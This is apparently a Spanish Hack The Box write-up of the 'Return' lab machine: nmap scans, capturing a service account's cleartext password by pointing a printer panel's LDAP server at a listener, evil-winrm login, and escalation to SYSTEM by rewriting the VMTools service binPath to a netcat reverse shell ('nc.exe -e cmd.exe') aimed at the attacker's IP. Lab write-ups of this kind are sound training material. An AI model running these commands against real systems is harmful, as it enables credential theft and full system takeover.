---
layout: post
title: Return
date: 2023-01-21
description: 
img:
fig-caption:
tags: [eJPT, OSCP (Escalada)]
---
___

<center><img src="/writeups/assets/img/Return-htb/Return_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de impresora

* Information Disclosure

* Abuso del grupo Server Operators

* Manipulación de servicios

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.11.108 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 14:12 GMT
Initiating SYN Stealth Scan at 14:12
Scanning 10.10.11.108 [65535 ports]
Discovered open port 445/tcp on 10.10.11.108
Discovered open port 139/tcp on 10.10.11.108
Discovered open port 80/tcp on 10.10.11.108
Discovered open port 135/tcp on 10.10.11.108
Discovered open port 53/tcp on 10.10.11.108
Discovered open port 49674/tcp on 10.10.11.108
Discovered open port 49675/tcp on 10.10.11.108
Discovered open port 593/tcp on 10.10.11.108
Discovered open port 636/tcp on 10.10.11.108
Discovered open port 49667/tcp on 10.10.11.108
Discovered open port 88/tcp on 10.10.11.108
Discovered open port 9389/tcp on 10.10.11.108
Discovered open port 49682/tcp on 10.10.11.108
Discovered open port 49664/tcp on 10.10.11.108
Discovered open port 47001/tcp on 10.10.11.108
Discovered open port 464/tcp on 10.10.11.108
Discovered open port 5985/tcp on 10.10.11.108
Discovered open port 49671/tcp on 10.10.11.108
Discovered open port 49694/tcp on 10.10.11.108
Discovered open port 389/tcp on 10.10.11.108
Discovered open port 3269/tcp on 10.10.11.108
Discovered open port 49666/tcp on 10.10.11.108
Discovered open port 49665/tcp on 10.10.11.108
Discovered open port 3268/tcp on 10.10.11.108
Discovered open port 49679/tcp on 10.10.11.108
Completed SYN Stealth Scan at 14:12, 17.12s elapsed (65535 total ports)
Nmap scan report for 10.10.11.108
Host is up, received user-set (0.13s latency).
Scanned at 2023-01-21 14:12:13 GMT for 18s
Not shown: 62046 closed tcp ports (reset), 3464 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
           Raw packets sent: 90332 (3.975MB) | Rcvd: 64216 (2.569MB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -Pn -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 14:14 GMT
Nmap scan report for 10.10.11.108
Host is up (0.41s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-21 14:33:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-21T14:34:10
|_  start_date: N/A
|_clock-skew: 18m35s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.46 seconds

```

## Puerto 445 (SMB)

Con crackmapexec, aplico un escaneo para ver las versiones, el dominio y el hostname

```null
crackmapexec smb 10.10.11.108
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
```

Agrego return.local al /etc/hosts

```null
echo '10.10.11.108 return.local' >> /etc/hosts
```

## Puerto 80 (HTTP)

Con whatweb, escaneo las tecnologías que está utilizando el servidor web

```null
whatweb http://10.10.11.108
http://10.10.11.108 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.108], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
```

Al abrir la página principal, aparece lo siguiente:

<img src="/writeups/assets/img/Return-htb/1.png" alt="">

Dentro de la sección de ajustes, se puede ver un subdominio que conecta al LDAP proporcionado un usuario y una contraseña


<img src="/writeups/assets/img/Return-htb/2.png" alt="">

El tipo de dato de la contraseña es text, por lo que quiero pensar que son caracteres ASCII sin más, no está ocultando ninguna credencial

<img src="/writeups/assets/img/Return-htb/3.png" alt="">

Como puedo controlar la dirección a donde se conecta, introduzco mi IP y me pongo en escucha para analizar la petición

<img src="/writeups/assets/img/Return-htb/4.png" alt="">

Recibo una contraseña en texto claro

```null
nc -nlvp 389
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
Ncat: Connection from 10.10.11.108.
Ncat: Connection from 10.10.11.108:59921.
0*`%return\svc-printer
                      1edFg43012!!
```

Las almaceno en un archivo y valido si son válidas a nivel de sistema con crackmapexec

```null
crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```

Como son válidas, pruebo a conectarme por winrm

```null
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

Conecta sin problema, así que obtengo una shell con evil-winrm

```null
evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

Veo la primera flag

```null
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
e08b16621f847210569215caf1f64392
```

Miro los grupos a los que pertenece svc-printer

```null
*Evil-WinRM* PS C:\Program Files> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/21/2023 6:54:14 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Para saber que hacen estos grupos, busco en la [Documentación de Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)

Entre varios privilegios a los que tengo acceso, destaca el poder parar y arrancar servicios

Con sc.exe, creo un servicio que al arrancarse, ejecute un binario que me envíe una reverse shell a mi equipo

Subo el binario de netcat a la máquina

```null
*Evil-WinRM* PS C:\Windows\Temp> upload /opt/nc.exe
Info: Uploading /opt/nc.exe to C:\Windows\Temp\nc.exe

                                                             
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!
```

Pero no tengo acceso

```null
*Evil-WinRM* PS C:\Windows\Temp> sc.exe create revshell binPath="C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.6 443"
[SC] OpenSCManager FAILED 5:

Access is denied.
```

Puedo intentar manipular el binPath de un servicio ya existente


```null
*Evil-WinRM* PS C:\Windows\Temp> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                         True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys  True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                     True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                  True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                        False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                         False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                            True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                               True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                    True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                   True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                              False WMPNetworkSvc    
```

Es probable que no a todos los servicios tenga acceso

```null
*Evil-WinRM* PS C:\Windows\Temp> sc.exe config WMPNetworkSvc binPath="C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.6 443"
[SC] OpenService FAILED 5:

Access is denied.
```

Concretamente, solo puedo en VMTools

```null
*Evil-WinRM* PS C:\Windows\Temp> sc.exe config VMTools binPath="C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.6 443"
[SC] ChangeServiceConfig SUCCESS
```

Ahora si detengo el servicio y lo vuelvo a arrancar, como es una tarea privilegiada gano acceso como nt authority\system

```null
*Evil-WinRM* PS C:\Windows\Temp> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Windows\Temp> sc.exe start VMTools

```

Obtengo la shell

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.108.
Ncat: Connection from 10.10.11.108:59457.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Y puedo visualizar la segunda flag

```null
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
7d211b8ce29d41db0d4a7a007c305d3e
```